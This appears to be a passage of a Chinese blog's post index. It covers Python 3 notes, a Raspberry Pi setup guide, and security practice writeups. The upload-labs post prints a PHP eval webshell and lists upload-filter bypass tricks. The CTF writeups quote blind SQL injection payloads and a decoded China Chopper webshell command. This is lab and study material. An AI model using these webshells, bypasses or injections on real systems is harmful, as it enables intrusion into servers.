#可以注意到re虽然定义了sound但是并没有初始化。 继承(Inheritance) 类再细分为子类，可以通过继承(Inheritance)表达， 1234567891011121314class Bird(object): feather = True reproduction = &quot;egg&quot; def chirp(self, sound) print(sound)class Chicken(Bird): how_to_move = &quot;walk&quot; edible = Trueclass Swan(Bird): how_to_move = &quot;swim&quot; edible = Falsesummer = Chicken()print(summer.feather)summer.chirp(&quot;ji&quot;) 修改属性 super()调用子类 1234567891011class Bird(object): def chirp(self): print(&quot;sound&quot;)class Chicken(Bird): def chirp(self): super().chirp() #注意super().chirp() print(&quot;jack&quot;)bird = Bird()bird.chirp()summer = Chicken()summer.chirp() 命名规范 类命名用首字母大写，多个单词连接时单词首字母均大写，不使用下划线。 而类下的对象名、属性名、方法名使用小写，单词之间用下划线。 入门基本操作列表对象 每个列表也是一个类，而数据类型就是对象所属类的名称，而每个列表都属于这个类，新建列表就在创建类的一个对象。 1234a = [1, 3, 5, 7, 9]print(type(a))print(dir(a)) #查询类或者对象的所有属性，这里用dir(a)和dir(list)并没有区别。 列表操作 1234567891011a = [1, 3, 5, 9, True, &quot;Good&quot;, 9.6]a.count(5) #查看多少个元素5a.index(3) #元素3第一次出现的下标a.append(6) #末尾添加元素6a.sort() #排序，但是如果列表存在内嵌列表情况会报错a.reverse() #颠倒次序a.pop(n) #取出末尾数，n可以指定位置a.remove(x) #去除第一次出现的元素xa.insert(m,n) #在下标为m的位置插入na.clear() #清空列表del list[x] #删除末位 元组与字符串：不可变更内容，所以仅能查询，字符串为特殊的元组，可以通过删除原有字符串新建方式改变内容。 123456789101112131415161718192021222324252627282930a = (1, 3, 5, 7, 9)a.count(x) #元素x的出现次数a.index(x) #元素x第一次的下标b = &quot;abcd&quot;b.index(x)b.count(x)b.find(x) #查找元素x第一次出现的位置，与index不同的是不包含返回-1b.rfind(x) #从右开始查找第一次出现位置b.rindex(x) #从右开始查找第一次下标b.split(&quot;xx&quot;) #以xx为分隔符，记得xx也会被去除b.rsplit(&quot;xx&quot;) #从右开始，不指定分隔次数和split没区别b.strip(&quot;xx&quot;) #去除开头和结尾的xx元素b.replace(m,n) #用n替换mb.capitalize() #第一个字母大写b.lower() #全部改为小写b.upper() #全部改为大写b.swapcase() #大写字母改为小写，小写字母改为大写b.title() #将每个词首字母大写b.center(m,n) #以b为中心，将n放于长为m的字符串两端，小于时会直接返回。b.ljust(m,n) #b左对齐，其他空余填充nb.rjust(m,n) #b右对齐，其他空余填充nb.isalnum #判断是否所有字符为字母或者数字b.isalpha #判断是否所有字符为字母b.isdigit() #判断是否所有字符为数字b.istitle() #判断是否所有词首字母为大写b.isspace() #判断是否所有字符为空格b.islower() #判断是否所有字符为小写b.isupper() #判断是否所有字符为大写 词典对象：词典也是类 1234567test_dict = &#123;&quot;a&quot;:1, &quot;b&quot;:2&#125;print(type(test_dict))print(test_dict.keys()) #keys()方法，输出key(键)。print(test_dict.values()) #values()方法，输出value（值）print(test_dict.items()) #items()方法，输出print(type(test_dict.items())) #dict_items数据类型test_dict.clear() #清空词典 对象从下面基本上很容易看出很多语句都像是基于对象的类和定义函数的样式实现的 循环对象 pythno3的循环先使用内置函数iter()将列表转化为循环对象，循环时每次包含了一个__next__()方法，在循环结束时抛出StopIteration异常，这就是手动进行python3中的循环的过程。 12345678test_iter = iter([1, 2, 3])test_iter.__next__()test_iter.__next__()test_iter.__next__()test_iter.__next__() #在这步会出现异常，for item in iter([1, 2]) print(item) #改为for类似的循环， 生成器(generator)：可以用来自定义循环对象，编写与定义函数类似，将return改为yield即可，遇到yield会暂停并输出之后的值，再次调用才暂停地方继续开始，循环往复。 12345678def gen(): a = 10 yield a a *= 2 yield a yield &quot;test&quot;for i in gen(): print(i) 函数对象 有__call__对象的都可以被当作函数。 12345class test(object): def __call__(self, a): return a + 5test2 = test()print(test2(5)) 模块对象：在基础语法的内容简单概述过，time就是一个模块，sleep是其中的一个方法。 123from time import sleepsleep(3)print(&quot;test&quot;) 简单暴力的全部引入 12from time import *sleep(10) 使用对象属性的方法调用， 1234import timeprint(&quot;test&quot;)time.sleep(5)print(&quot;now&quot;) 定义新名称 12import time as testtest.sleep(5) 文件操作打开文件方式(mode)：”r”:读取已存在文件，”w”:新建文件并写入，”a”如果文件存在写入结尾，不存在新建文件写入， 使用open函数创建文件对象，open(file_name, mode) 12test1 = open(&quot;text.txt&quot;, &quot;r&quot;)test2 = open(&quot;text.txt&quot;, &quot;w&quot;) 操作文件内容 123456789# 仅读取时test1.read(x) #读取x个字节数据test1.readline() #读取一行test1.readlines() #读取所有行，以列表形式存储# 写入时test2.write(&quot;new content&quot;) #linux换行符为\\n，windows为\\r\\n，windows使用\\n会有空行test.close() #读写后及时关闭， 上下文管理器(context manager)：不仅简单，而且自动关闭文件。 1234with open(&quot;text.txt&quot;, &quot;w&quot;) as test: test.write(&quot;new content&quot;)print(test.closed) 上下文管理器的基于流程：__exit__的exc_type、exc_value、traceback用于描述异常。 123456789101112class Vow(object): def __init__(self, text): self.txt = text def __enter__(self): self.text = &quot;Hi, &quot; + self.text return self def __exit__(self, exc_type, exc_value, traceback): self.text = self.text + &quot;!&quot;with Vow(&quot;I&#x27;m fine&quot;) as myVow: print(myVow.text)print(myVow.text) 包pickle包： 存入 将某些对象保存然后存到磁盘文件。分为序列化对象(Serialization)和存入文件。 1234567891011import pickleclass Bird(Object): feather = True reproduction_method = &quot;egg&quot;summer = Bird()pickle_string = pickle.dumps(summer) #序列化对象with open(&quot;summer.pkl&quot;, &quot;wb&quot;) as test: test.write(pickle_string) #存入文件 或者 123summer = Bird()with open(&quot;summer.pkl&quot;, &quot;w&quot;) as test: pickle.dump(summer,test) 恢复 123456789import pickleclass Bird(object): feather = True reproduction_method = &quot;egg&quot;with open(&quot;summer.pkl&quot;, &quot;rb&quot;) as test: summer = pickle.load(f)print(summer, feather) time包 计算机内存在挂钟时间(Wall Clock Time)和处理器时间(Processor Clock Time)，挂钟时间为从某个固定时间到现在间隔，处理器时间则为cpu运行时间。 1234567891011121314151617import timeprint(time.time()) #挂钟时间，/sstart = time.clock()for i in range(100000): print(1**2)end = time.clock()print(end - start) #程序运行时间 /stime.sleep(x) #休眠x秒time.gmtime() #挂钟时间转为各个单位time.localtime() #当地时间的挂钟时间格式time.mktime(xx) #单位时间转为挂钟时间。 datetime包： 由date(指日期)和time(指具体时间)组成，datetime.date类和datetime.time类。 格式默认是年、月、日、时、分、秒、毫秒，而datetime.timedelta传递参数可以有seconds、weeks、days、hours、milliseconds(毫秒)、microseconds(微秒)。 1234567import datetimet_1 = datetime.datetime(2020, 5, 14, 22, 24)t_2 = t_1 + datetime.timedelta(weeks = 4)print(t_1)print(t_2) 转化格式，根据原有格式替换时间内容即可。 年%Y、月%m、日%d、时%H、分%M、秒%S、星期%A、简写星期%a、上下午%p。 12345678from datetime import datetimestr = &quot;abs-1997-12-23-02:00:00.txt&quot;format = &quot;abs-%Y-%m-%d-%H:%M:%S.txt&quot;t = datetime.strptime(str, format)print(t) 正则表达式re包的正则操作：re.search(pattern, string)， 123import rem = re.search(&quot;[0-9]&quot;, &quot;sxascsdf1scwda&quot;)print(m.group(0)) #返回的为找到的结果 re.match(pattern, string)检查起始字符 搜索并替换：re.sub(pattern, replacement, string) 12import restr = re.sub(&quot;[0-9]&quot;, &quot;boy&quot;, &quot;yes, 1&quot;) #注意替换是以单个字符为单位 re.split：分隔字符串，放于表中返回 re.findall：搜索字符串，放于表中返回 符号的使用： 123456789101112131415161718192021. #任意一个字符a|b #字符a或b[abc] #a、b、c中的一个字符[0-9] #0-9的一个字符[a-z] #a-z的一个字符[^a] #不是a的一个字符\\s #空格\\S #非空格\\d #一个数字，相当于[0-9]\\D #一个非数字，相当于[^0-9]\\w #数字或字母，相当于[0-9a-zA-Z]\\W #非数字或字母，相当于[^0-9a-zA-Z]#重复类型* #重复超过0次或更多次+ #重复一次或超过1次? #重复0次或1次&#123;m&#125; #重复m次。[1-3]&#123;2&#125;相当于[1-3][1-3]&#123;m, n&#125; #重复m-n次，#位置^ #字符串起始位置$ #字符串结尾位置 群(group) ground(number)查询群，group(0)为整个表达式结果，group(1)为第一个群，(?P&lt;name&gt;...)为群命名格式，即可xxx.group(&quot;name&quot;)提取。 123456789101112import recontent = &quot;abcd_output_1994_12_abcd&quot;m = re.search(&quot;(\\d&#123;4&#125;)_(\\d&#123;2&#125;)&quot;, content)print(m.group(2))#group(0)输出1994——1912,group(1)输出1994，group(2)输出1912m = re.search(&quot;(?P&lt;year&gt;\\d&#123;4&#125;)_(?P&lt;month&gt;\\d&#123;2&#125;)&quot;, content)print(m.group(&quot;year&quot;, &quot;month&quot;))#命名了两个，多个输出为元组 其他问题定义函数内数据容器与外部数据容器 123456abc = [1, 3, 5, 7]def change_list(abc): abc[0] = abc[0] + 1 return abcprint(change_list(abc))print(abc) ```","path":"2020/05/14/python3学习/","date":"05-14","excerpt":"python3学习基础篇","tags":[{"name":"python3","slug":"python3","permalink":"https://www.ea6th.top/tags/python3/"}]},{"title":"树莓派入手","text":"树莓派使用记录一直想买个树莓派玩玩，但上半年花销超支严重，于是这学期申请了科技奖学金来购买树莓派，就是学校发钱太晚（实际上时间正好用来学四级），然后终于到12.19到手，话不多说，开始搭建。 基本环境：windows 基本操作一般最低需要存储卡+开发板+壳子+官方电源适配器（避免不必要的问题）+散热片+HDMI线（连接屏幕）+读卡器，我的是4B版。 一般来说拆过笔记本/台式电脑照着官方图都能装好，不再介绍。 SD卡系统安装先格式化SD卡，去树莓派官方下载自己喜欢的镜像即可。这里我使用的是Ubantu MATE版，也有很多教程介绍如何安装kali的，请移步参考链接。安装镜像到SD卡很多，可以选择操作简单而且轻量级的Etcher，无脑式操作即可成功安装。然后挨个连线即可。 连接树莓派启动成功后，由于没买屏幕，需要通过SSH连接树莓派，但是据称16-11开始默认禁用SSH服务（虽然我从安全角度很赞赏，毕竟树莓派SSH初始都一样），所以手动设置SSH服务。 开启SSH服务 在根目录(也就是安装镜像系统后那个boot盘)新建一个空白内容且名称为ssh的空白文件，无后缀名，仅有ssh的文件名即可。 WIFI联网设置 可以通过网线直接连路由器，也可以用下面的方法。 在boot盘的根目录新建wpa_supplicant.conf文件，并填入下面内容。 123456789101112131415161718country=CNctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdevupdate_config=1network=&#123;ssid=&quot;WiFi-A&quot;psk=&quot;12345678&quot;key_mgmt=WPA-PSKpriority=1&#125;network=&#123;ssid=&quot;WiFi-B&quot;psk=&quot;12345678&quot;key_mgmt=WPA-PSKpriority=2scan_ssid=1&#125; 前三行基本上不需要修改，下面每一个network都是类似于记录的WIFI的连接基本信息，ssid对应WIFI名称，psk对应WIFI密码，key-mgmt对应加密方式，priority为优先级，按需修改即可。 其中如果无密码keymgmt为NONE，psk字段删除即可。 ssh连接前面设置后还存在一个问题，没有IP地址，没有IP地址就没办法连接。最简单的方法是登录路由器的后台管理（路由器背面有后台地址，密码问询修理人员）然后看一个名为raspberrypi字样的即可，如果不存在可能前面步骤错误。 拿到IP地址后，使用Xshell（习惯）连接，默认用户名是pi，密码是raspberry。一般来说树莓派官方系统还有Ubantu MATE之类直接可以当作linux使用，所以按linux操作即可。 修改基本信息使用SSH连接毕竟默认设置太容易出问题，开始修改默认设置。 root：pi用户登录后 sudo passwd root设置root密码，sudo passwd -unlock root开启root账号，然后使用su root即可测试是否生效。 pi：一般来说我们还是多用pi先进行登录，然后切为root用户，修改pi密码命令为sudo psswd pi。 切换如linux一样为su xxx。 修改主机名：避免一下子就被认出来还有为了显示特征。 sudo vi /etc/hosts看到127.0.1.1 xxxx，修改即可， sudo vi /etc/hostsname看到xxx继续修改即可。 可能出现的错误passwd:Authentication token manipulation error_错误的解决办法：参考这个，https://cloud.tencent.com/developer/article/1368358 远程连接没有屏幕的话只看命令行难免不过瘾，于是开始远程连接，（在第三代开始VNC基本内置树莓派，但需要手动开启） sudo raspi-config选择Interfacing Options——VNC——YES，然后y继续同意安装VNC服务，正常来说就能安装完成， vncserver开启vnc服务，记住最后一行的IP地址。 然后下载电脑的VNC,通过pi的用户名和密码即可登录成功。 正式使用经过前面的设置，基本上都可以了，然后可以开始正式进行。 换源linux万年不变的第一步， 备份 sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak sudo cp /etc/apt/sources.list.d/raspi.list /etc/apt/sources.list.d/raspi.list.bak 修改源 sudo vi /etc/apt/sources.list 第一行改为想要的镜像源即可，参考镜像源，注意格式， 更新源设置sudo vi /etc/apt/sources.list.d/raspi.list如上类似。 更新源， 1234sudo apt-get update 更新列表sudo apt-get upgrade sudo apt-get dist-upgrade 更新软件版本sudo rpi-update 更新系统内核 可能好用的命令apt-get remove xxxx卸载软件， apt-get remove -purge xxx卸载并清除配置， top和df -ah查看进程和磁盘占用，也可以下载Play的RasPi Check安装在手机查看状态。（虽然与不错的项目可以在网页显示，但是感觉好浪费。。。） 关机重启 良好的习惯是成功的开始，直接拔插电源关机对树莓派并不是很友好，推荐linux的命令关机重启如： 12shutdown nowsudo reboot 蓝牙123456sudo apt-get updatesudo apt-get upgrade -ysudo apt-get dist-upgrade -y 基本三件套sudo apt-get install pi-bluetooth bluez bluez-firmware blueman 安装相关包sudo usermod -G bluetooth -a pi 添加用户到蓝牙组sudo reboot 重启 一般来说，这样就可以使用了，如果还是不行推荐远程连接看看蓝牙是否存在。 参考链接 树莓派安装kali：https://mp.weixin.qq.com/s/aOWEheNMxIYTBalDErSuMQ 树莓派实验室：https://shumeipai.nxez.com/","path":"2020/04/21/树莓派入手/","date":"04-21","excerpt":"树莓派使用记录","tags":[{"name":"树莓派","slug":"树莓派","permalink":"https://www.ea6th.top/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/"}]},{"title":"一句话记录","text":"_练习了upload-labs，WriteUp不写了，全网满天飞，记录学到的东西。 upload-labs 上面为绕过方法，下面为php防范伪代码。 准备工作准备好火狐和burp，安装不再赘述，提几个容易出错的地方。 代理问题 火狐现阶段新版加入了本地代理不经过系统代理的规则，所以使用upload-labs容易burp抓不到127.0.0.1和localhost的包。 解决方法：进入about:config的页面，搜索network.proxy.allow-hijacking_localhost改为True即可，（记得改火狐本地代理和windows系统代理） 如果事先准备好了phpstudy，为了方便，建议检查文件上传是否成功找upload-labs\\WWW\\upload路径下的文件确认。 一句话 一句话绕过语句 &lt;?php eval(@$_POST[&#39;a&#39;]); ?&gt;。 一句话图片马，使用HxD或者命令将一句话填充至一个图片末尾。 记录简单的 js检查：nojavascript、抓包 服务端文件头content-type字段校验：抓包手动改为image/gif即可 扩展名，不用提，太简单。 基本php文件上传的基本php使用， 1234$_FILES\\[‘file’][‘name’] 客户端文件名称$_FILES\\[‘file’][‘type’] 文件的MIME类型$_FILES\\[‘file’][‘size’] 文件大小 单位字节$_FILES\\[‘file’][‘tmp_name’] 文件被上传后再服务器端临时文件名，可以在php.ini中指定 php上传的检查 随机化文件名称 1234$temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];$img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; 不统一大小写，例如xxx.phP等等 1$file_ext = strtolower($file_ext); //转换为小写 上传检测文件名白名单处理，.htaccess会被解析php+图片马。 1$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); //白名单 后缀名加空格绕过， 1$file_ext = trim($file_ext); //首尾去空 后缀名加点绕过（windows特性）index.php. 1$file_name = deldot($file_name);//删除文件名末尾的点 ::$DATA绕过，在后缀名后加上即可，（windows特性） 1$file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA 复合式绕过，info.php. . 对于将文件后缀名改为空的绕过，双写php即可。 1$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); 对于白名单判断，有img_path 时，可用%00截断，index.php%00，如果是post传输，需要在十六进制里面进行修改，这个着实没有试验成功，可能我的版本高了些。 图片马过文件头检测，下面的几种都可以直接使用。 1$bin = fread($file, 2); 1$info = getimagesize($filename); 1$image_type = exif_imagetype($filename); 条件竞争类，不断上传时不断在浏览器访问。。。（让程序来不及重命名） 12rename($upload_file, $img_path);unlink($upload_file); python实现详见https://paper.seebug.org/560/。 CVE-2015-2348 move_uploaded_file()漏洞， 123$file_name = $_POST[&#x27;save_name&#x27;];$img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name;if (move_uploaded_file($temp_file, $img_path)) 本身无问题，但是save_name控制的img_path的输出，可以在save_name的post进行00截断。 超长文件名截断上传：windows 258byte，linux 4096byte。 仅校验后缀名为asp/php/jsp的文件内容，上传一个包含一句话的txt文件，然后上传.php引用txt的路径&lt;?php Include(&quot;路径&quot;);?&gt; 数组绕过，content[]=&lt;?php phpinfo();?&gt;&amp;ext=php，修复换用fwrite即可。 1file_put_contents($filename,$ext,$data); 不同平台 windows：加.、空格、xx.php:xx.jpg、xx.php:: $DATA，下划线 linux：大小写 针对特有的服务 IIS解析漏洞： .asp、.asa的文件，.asp:1.jpg被当作asp解析。 6.0的目录路径检测解析，文件名改为xxx.asp/xx.jpg会被当作asp解析。以及xx.php;xx.jpg被当作php解析。 Apache解析漏洞： 前面的.htaccess 遇到不认识的扩展名依次向前解析，按最后一个合法后缀执行，文件加上合法后缀即可利用。 Nginx解析漏洞：低版本%00.php进行解析。 PHP CGI解析漏洞： cgi.fix_pathinfo=1 更多更多php上传绕过问题的函数以及CMS、编辑器、waf等等。 https://paper.seebug.org/560/ https://cloud.tencent.com/developer/news/338482","path":"2020/03/14/一句话记录/","date":"03-14","excerpt":"_练习了upload-labs，WriteUp不写了，全网满天飞，记录学到的东西。","tags":[{"name":"上传","slug":"上传","permalink":"https://www.ea6th.top/tags/%E4%B8%8A%E4%BC%A0/"}]},{"title":"掘安平台Writeup","text":"新学习sql注入，找个东西训练下。 刷一部分sqli-labs，先掘安平台做点CTF，主要目的是练习web，MSIC和crypto则顺便。 miscwelcome没什么说的，关注公众号jasafe110然后发flag就行。 hello流量分析基础题目，工具wireshark 导入后为下图界面 点工具栏的Protocol使之通过传输协议排序，或者直接通过上面的过滤器，找TCP和HTTP即可（基础类型的一般这两个够用）。 挨个点，注意最下面的窗口会显示传输具体内容，发现有一个time为11.930535的，编号为73的有flag字样。但是这个现在没办法复制，选中有flag字样的那一行后右键——追踪流——TCP或者HTTP均可，然后现在就可以复制了。 tips: 流量分析这些即为平时使用浏览器访问所产生的数据流，有不同协议类型（TCP、HTTP、UDP等等），具体可以找wireshark或者流量分析的书看，之前初始wireshark有过部分总结。 misc-hello解压是个图片，字节分析HxD看一眼，搜索下flag，结束 disk磁盘里藏着flag 解压后发现两个文件，flag.dmg和.DS_Store，明显flag.dmg有用，放HxD看一下， 大多为乱码，搜索flag又没有有价值的线索，滑动着看，发现临近底部时候出现了%PNG，图片png标识也是这个，复制从%PNG的十六进制数，直到00结尾前的IEND®B`‚这个也是PNG的结束位，新建粘贴另存为xx.png，发现flag 图片对比两张图片有什么不一样吗？ 解压，发现两个图片，flag.png和xor.png，放到HxD发现前面部分只有开头有差别，联系上题目为图片对比，猜测异或。（其实也可能是先修复文件头然后放到stegsolve里面对比，但是这里是字符异或） 上脚本，第一次做题写python脚本，不太熟练。（大佬们轻点吐槽） 123456789101112131415161718ab = open(&quot;flag.png&quot;, &quot;rb&quot;).read(20)print(ab)ac = open(&quot;xor.png&quot;,&quot;rb&quot;).read(20)print(ac)ab_1 = list(ab);ac_1 = list(ac);print(ab_1)print(ac_1)ad = [&#x27;x&#x27; for n in range(20)]for i in range(19) : ad[i] = ab_1[i] ^ ac_1[i] i = i + 1print (ad)for i in range(19): ad[i] = chr(ad[i]) i = i + 1ad = &quot;&quot;.join(str(i) for i in ad)print(ad) 然后出现结果 颜表情小姐姐漂亮的小姐姐 （非上图，原图无法显示，截屏的）一看，图片尺寸不太对劲，有点太宽太低了，猜测是修改像素值，先看原始尺寸为1566*798，十进制转十六进制，得到061e*031e，放到HxD里面搜索这两个，两个在临近才对，随便修改下为041e，通关。 真正的黑客才可以看到本质真正的黑客才可以看到本质 解压，hacker.png，放到StegSolve，看各个色位的效果，Blue plane 0出现二维码，扫码或者QR识别，得到flag。 隐藏在黑夜里的秘密隐藏在黑夜里的秘密 解压发现加密，放到zip密码爆破工具里面发现异常，应该是伪加密， 放到HxD里面，搜索504B（即文件头），找1400后面的，这里面是0008或者0908，挨个修改09为00（记得文件右键解除锁定），有两个需要修改，（下图为修改后的部分） 然后解压，发现flag.txt和Treeinblack.bmp，bmp格式经常是StegSolve有关的图片隐写格式，打开，然后一直点箭头，发现到Red plane 3时候就已经出现结果。（说好的黑夜呢？不应该是black吗？） tips: 伪加密牵扯到zip压缩包格式问题，在zip中，504B0304为文件头（即文件标识），1400为解压所需版本，0100为加解密（偶不需要密码，奇数需要密码，所以修改09为00），0800为压缩方式，后面的两个xxxx和xxxx为文件修改时间和日期，再后面为CRC-32校验、尺寸、文件名长度、扩展记录等等。 pikaqiuWhy can’t I open this picture 解压后发现pikaqiu.jpg的图片，但是损坏，放到HxD里面，发现文件头和文件尾都很不正常，搜了下jpeg的文件头和文件尾，文件头为FFD8FF，文件尾为FFD9，添加即可，注意初始已经有FF了，所以文件头只需要添加FFD8。 tips： 不做搬运工，直接放链接文件头与文件尾总结 decodesee through the appearance to perceive the essence 解压，decode.docx的文件，估计是文档隐写， 在word中找到显示，把隐藏文字勾选即可。（复制时候可能无法复制，直接清除样式即可） damageHelp me fix him 格式：Flag{} 还是图片隐写类，放到HxD里面修改文件头，文件头与文件尾总结，注意已经有G和9了，加上IF8（即49 46 38就行了），然后是动图，简单，放到PS或者StegSolve——Frame Browser就行了（注意e可能会被认为是o） 低头才是王道99 9 9 88 11 5 5 66 3 88 3 6 555 9 11 4 33格式:jactf{} 提示低头，低头肯定是键盘密码了，连续的都是重复，而且不超过3个，所以第一个数字确定从哪数，也就是横坐标，多少个位数决定纵坐标。 所以99是l，9是o，88是k，以此类推，得到一串字符，加上格式就行了 数据包分析第一解出人：Gemini_Pulsar misc-挑战1 一堆数据表，还是走基本路子，大多在HTTP里面，Protocol排序后先看HTTP协议，发现一堆base64有关的，应该是base64编码传输，复制一两个，然后解码 百度了一下可能是中国菜刀一句话有关的东西，不过没关系，做这个题时候我也没学好菜刀，然后挨个复制了几个HTTP的base64编码传输，大多都是这样，没啥用。开始针对性找，对base64的先忽略。 然后发现一个下图的数据包，后面有FFD8之类的，前面图片隐写知道这是图片的文件头，后面FFD9也对应，复制Form item:”z2”的值，放到HxD里面，并且重命名为jpg后缀， 提交一下，发现不对，就知道没这么简单，那估计是密码。 继续向后走快结束HTTP时，发现下图的数据包，PK是zip压缩包的前缀，后面有well,you need passwd!，还有箭头，确定了，复制值（别复制编码后的，通过Line-based显示分组字节并改为原始数据再复制），然后解压输入上面图片得到的密码即可拿到有flag的flag.txt文件。 sqlmap二分法类型：Forensic 黑客利用漏洞从Web系统中窃取了什么机密信息？ sqlmap二分法，幸亏之前学了sql注入，然后刷了sqli-labs，二分法就是通过盲注然后猜测数据库内信息的名称的过程，基本路线是通过猜测数据库名称是否&gt;64，然后根据回显继续进行判断是否&gt;96，继续判断是否大于112，然后再去中间值判断，之后的字符判断重复这个过程。 1192.168.200.186 - - [26/Oct/2017:05:36:44 +0000] &quot;GET /admin_fsoEdit.php HTTP/1.1&quot; 404 455 &quot;-&quot; &quot;-&quot; 这样的大多对解题无用，跳过，后面的由于是服务器日志记录，所以先进行URL解码再看， 1&quot;GET /vulnerabilities/sqli_blind/?id=123%22%29%20AND%20MAKE_SET%289884%3D9884%2C6191%29%20AND%20%28%22xQSw%22%20LIKE%20%22xQSw&amp;Submit=Submit HTTP/1.1&quot; 200 1702 解码为 1&quot;GET /vulnerabilities/sqli_blind/?id=123&quot;) AND MAKE_SET(9884=9884,6191) AND (&quot;xQSw&quot; LIKE &quot;xQSw&amp;Submit=Submit HTTP/1.1&quot; 200 1702 还是无用，这样类似的忽略，继续跳着看， 1&quot;GET /vulnerabilities/sqli_blind/?id=123%27%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20flag%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E224001%2C0%2C5%29%29%29%29%29KJQq%29--%20UkLR&amp;Submit=Submit HTTP/1.1&quot; 200 1702 解码后 1&quot;GET /vulnerabilities/sqli_blind/?id=123&#x27; AND (SELECT * FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM dvwa.flag ORDER BY flag LIMIT 0,1),1,1))&gt;224001,0,5)))))KJQq)-- UkLR&amp;Submit=Submit HTTP/1.1&quot; 200 1702 不太熟悉，但是看到常用的了，IF、ORD、ORDER BY、LIMIT，已经靠近了， 1&quot;GET /vulnerabilities/sqli_blind/?id=123%27%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20flag%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E64%2C0%2C5%29%29%29%29%29KJQq%29--%20UkLR&amp;Submit=Submit HTTP/1.1&quot; 200 1702 解码为 1&quot;GET /vulnerabilities/sqli_blind/?id=123&#x27; AND (SELECT * FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM dvwa.flag ORDER BY flag LIMIT 0,1),1,1))&gt;64,0,5)))))KJQq)-- UkLR&amp;Submit=Submit HTTP/1.1&quot; 200 1702 完美，sql注入的二分法第一句话，而且后面语句发现了 1&quot;GET /vulnerabilities/sqli_blind/?id=123%27%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20flag%20LIMIT%200%2C1%29%2C1%2C1%29%29%21%3D102%2C0%2C1%29%29%29%29%29KJQq%29--%20UkLR&amp;Submit=Submit HTTP/1.1&quot; 200 1702 解码 1&quot;GET /vulnerabilities/sqli_blind/?id=123&#x27; AND (SELECT * FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM dvwa.flag ORDER BY flag LIMIT 0,1),1,1))!=102,0,1)))))KJQq)-- UkLR&amp;Submit=Submit HTTP/1.1&quot; 200 1702 每一次二分法后专门判断了是否相等的操作，这样就可以直接用%21%3D（即!=）去搜索，然后记录后面的字符，挨个记录后为 1102 108 97 103 123 51 50 56 55 102 101 51 48 48 102 50 56 101 50 52 97 101 102 97 50 100 56 54 56 56 51 56 51 50 99 57 102 125 转为字符串为flag{3287fe300f28e24aefa2d86883832c9f}，提交不对。。。看完WP发现大佬是python2，我没python2，然后联系平台大佬才发现这是个希尔加密，再解密就是提交的flag，但是并没有搞懂密钥是哪个。 机密信息类型：Forensic 黑客通过webshell往Web服务器写入了一串机密信息，你能找出机密信息吗？ 解压文件夹黑客留下的机密信息，日常，先修改后缀名为zip，解压放到HxD发现是个网页，虽然感觉不会有什么有用的东西，先改后缀名为.html，界面如下图，应该是DVWA的训练。 没啥用，直接看WireShark，还是老路走，点Protocol让他们根据协议分类，然后看HTTP协议的内容。 基于这数据包出题的习惯，建议已经过新手的直接从后面倒着看，倒数第二个发现明显的base64_decode， base64解码得到 12@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(&quot;-&gt;|&quot;);;$D=base64_decode($_POST[&quot;z1&quot;]);$F=@opendir($D);if($F==NULL)&#123;echo(&quot;ERROR:// Path Not Found Or No Permission!&quot;);&#125;else&#123;$M=NULL;$L=NULL;while($N=@readdir($F))&#123;$P=$D.&quot;/&quot;.$N;$T=@date(&quot;Y-m-d H:i:s&quot;,@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R=&quot;\\t&quot;.$T.&quot;\\t&quot;.@filesize($P).&quot;\\t&quot;.$E.&quot;&quot;;if(@is_dir($P))$M.=$N.&quot;/&quot;.$R;else $L.=$N.$R;&#125;echo 